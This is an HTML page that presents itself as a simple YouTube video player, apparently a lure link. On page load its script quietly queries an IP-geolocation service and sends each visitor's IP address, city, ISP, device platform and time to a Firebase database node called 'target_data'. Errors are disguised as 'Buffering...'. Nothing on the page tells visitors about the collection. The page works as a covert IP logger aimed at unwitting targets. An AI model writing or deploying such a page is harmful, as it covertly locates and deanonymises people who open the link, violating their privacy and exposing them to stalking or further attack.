<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;} iframe{width:100%;height:100%;border:none;}</style>
</head>
<body>
    <iframe id="player" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
        const config = { databaseURL: "https://data-28355-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(config);
        const db = firebase.database();

        // 1. YouTube ID load karna
        const params = new URLSearchParams(window.location.search);
        const vId = params.get('v') || 'dQw4w9WgXcQ'; 
        document.getElementById('player').src = `https://www.youtube.com/embed/${vId}?autoplay=1`;

        // 2. Data Capture and Push
        async function capture() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const ip = await response.json();
                
                const payload = {
                    ip: ip.ip || "Unknown",
                    city: ip.city || "Unknown",
                    isp: ip.org || "Unknown",
                    device: navigator.platform,
                    time: new Date().toLocaleString()
                };

                // Database ke 'target_data' node mein bhej rahay hain
                db.ref('target_data').push(payload);
            } catch(e) { console.log("Buffering..."); }
        }
        window.onload = capture;
    </script>
</body>
</html>
